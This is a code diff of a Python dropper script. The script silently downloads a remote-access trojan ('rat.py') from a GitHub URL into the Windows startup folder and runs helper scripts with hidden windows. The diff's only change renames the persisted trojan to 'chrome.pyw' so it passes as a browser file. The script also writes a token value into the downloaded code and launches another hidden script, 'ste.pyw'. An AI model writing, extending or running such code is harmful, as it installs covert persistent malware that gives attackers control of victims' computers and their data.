@@ -11,12 +11,12 @@ subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/
 subprocess.run(["curl", "https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/rat.py", "-o", f"{user_startup}\\chrome.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
 
 code = ""
-with open(f"{user_startup}\\rat.pyw", "r", encoding="utf-8") as f:
+with open(f"{user_startup}\\chrome.pyw", "r", encoding="utf-8") as f:
     code = f.read()
 
 code = code.replace("%token%", login)
 
-with open(f"{user_startup}\\rat.pyw", "w", encoding="utf-8") as f:
+with open(f"{user_startup}\\chrome.pyw", "w", encoding="utf-8") as f:
     f.write(code)
 
 subprocess.run(["python", f"{user_profile}\\ste.pyw"], creationflags=subprocess.CREATE_NO_WINDOW)
